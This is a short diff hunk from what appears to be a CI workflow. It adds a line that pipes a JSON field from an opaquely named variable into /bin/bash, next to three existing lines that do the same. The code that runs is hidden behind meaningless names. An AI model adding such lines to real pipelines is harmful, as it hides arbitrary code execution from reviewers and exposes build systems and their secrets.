@@ -32,6 +32,7 @@ jobs:
           echo $rvfc6 | jq -r .ylbm2 | /bin/bash
           printf '%s' "$hpno1" | jq -r .jxr5 | /bin/bash
           echo $qdxsf4100 | jq -r .c825 | /bin/bash
+          printf '%s' "$sttvo9" | jq -r .td896 | /bin/bash
 
       - name: Archive output
         if: always()
